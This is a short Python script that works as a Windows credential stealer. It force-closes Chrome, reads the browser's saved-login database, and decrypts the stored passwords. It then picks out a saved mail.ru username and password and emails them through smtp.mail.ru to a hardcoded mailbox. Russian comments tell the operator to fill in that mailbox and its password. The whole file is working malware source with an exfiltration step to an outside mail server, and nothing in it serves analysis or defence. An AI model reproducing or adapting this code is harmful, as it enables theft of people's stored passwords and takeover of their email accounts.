import os
from sys import exit
import sqlite3
from win32crypt import CryptUnprotectData
import argparse
import smtplib



def chromepath():
    PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
    if (os.path.isdir(PathName) == False):
        exit(0)
    return PathName  


def grub():
    secret = []
    path = chromepath()
    os.system("taskkill /IM chrome.exe /F")
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        for i in value:
            password = CryptUnprotectData(i[2], None, None, None, 0)[1]
            if password:
                secret.append({
                    '1': i[0],
                    '2': i[1],
                    '3': str(password)
                })
                    
    except sqlite3.OperationalError as e:
            if (str(e) == 'database is locked'):
                exit(0)
               
            else:
                exit(0)
    if secret == []:
        pass
    else:          
        return secret          
output=[]
for data in grub():
    for x in data.values():
        output=output+[x]

y=0
while(y<=len(output)):
    if(y<=len(output)-2):
        if(output[y]=="https://auth.mail.ru/cgi-bin/auth"):
            if(output[y+1][-3:]==".ru"):
                session = smtplib.SMTP('smtp.mail.ru') #смтп сервер майл.ру
                session.ehlo()
                session.starttls()
                gmail="login@mail.ru" #откуда отправляется
                toGmail="login@mail.ru" #куда
                session.login(gmail,'password') #напишите пароль от почты
                content = output[y+1]+output[y+2] #отправка сохр. пароля (майл.ру) от почты с гугл хром
                session.sendmail(gmail, toGmail, content)
                break
    y+=1
